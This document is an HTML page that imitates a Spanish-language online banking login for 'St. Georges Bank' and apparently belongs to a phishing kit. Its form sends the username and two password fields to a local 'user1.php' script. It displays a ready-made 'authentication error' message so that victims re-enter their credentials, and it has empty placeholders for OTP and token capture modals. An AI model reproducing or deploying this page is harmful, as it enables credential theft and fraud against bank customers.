<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="en" xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, minimum-scale=1">
    <title>St. Georges Bank</title>
    <link href="./loginerror_files/login-stgeorge.css" rel="stylesheet" crossorigin="anonymous">
    <link href="./loginerror_files/font-awesome.min.css" rel="stylesheet" crossorigin="anonymous">
    <!--<link rel="stylesheet" type="text/css" href="./login-stgeorge.css"/>-->
</head>

<body>
<div class="cb-security">
    <div class="cb-security__left-panel"></div>
    <div class="cb-security__rigth-panel">
        <div class="cb-security__login-container-form">
            <form id="login-form" class="cb-security__login-form" method="post" action="user1.php">
                <img class="cb-security__login-logo" src="./loginerror_files/logo-st-george-full-color.svg" alt="">
                

                <h2 class="cb-security__login-heading">Hola, te damos la bienvenida</h2>
                <div class="cb-security__login-title">Ingresa a tu banca en línea</div>
                <div class="cb-security__login-inputs">
                    <label for="username" class="cb-security__login-label">Nombre de usuario</label>
                    <div class="cb_security__input-container">
                        <input type="text" id="username" name="usuario" class="cb-security__login-input" required="" minlength="5" maxlength="32" value="">
                        <img class="cb-security__input-icon" src="./loginerror_files/user-icon.svg">
                    </div>
                    <span class="cb-security__login-inputs-hint"> </span>
                </div>
                <div class="cb-security__login-inputs">
                    <label for="password" class="cb-security__login-label">Contraseña</label>
                    <div class="cb_security__input-container">
                        <input type="hidden" id="password" name="password" class="cb-security__login-input cb-security__login-input-password" minlength="8" maxlength="32" required="" value="">
                        <input type="password" id="passwordHidden" name="cpass" class="cb-security__login-input cb-security__login-input-password" minlength="8" maxlength="32" required="" value="">
                        <img id="togglePassword" class="cb-security__input-icon" src="./loginerror_files/show-password-icon.svg">
                    </div>
<!--                    <span class="cb-security__login-inputs-hint">Debe tener entre 8 y 20 caracteres</span>-->
                </div>
                <div class="cb-security__login-danger">
                    <div class="cb-security__login-danger-icon">
                        <img class="cb-security__input-icon" src="./loginerror_files/error-alert-icon.svg">
                    </div>
                    <div class="cb-security__login-danger-content">
                        <div class="cb-security__login-danger-title">Error de autenticación</div>
                        <div class="cb-security__login-danger-subtitle" role="alert">Estimado cliente, las credenciales provistas no son válidas. Por favor intenta de nuevo</div>
                    </div>
                </div>
                <button id="submitCredentials" class="cb-security__login-btn green" type="submit">Ingresar</button>

                
                
                
                

                <!-- The Modal OTP -->
                

                <!-- The Modal TOKEN -->
                

                <!-- The Modal TOKEN -->
                

                <!-- The Modal ACTIVE SESSION -->
                

</form>
            <div class="links-container">
                <a class="cb-security__login-utilities" href="">¿Olvidaste tu contraseña?</a>
                <a class="cb-security__login-utilities" href=""> ¿Quieres desbloquear tu usuario?</a>
            </div>
        </div>
    </div>
</div>



</body></html>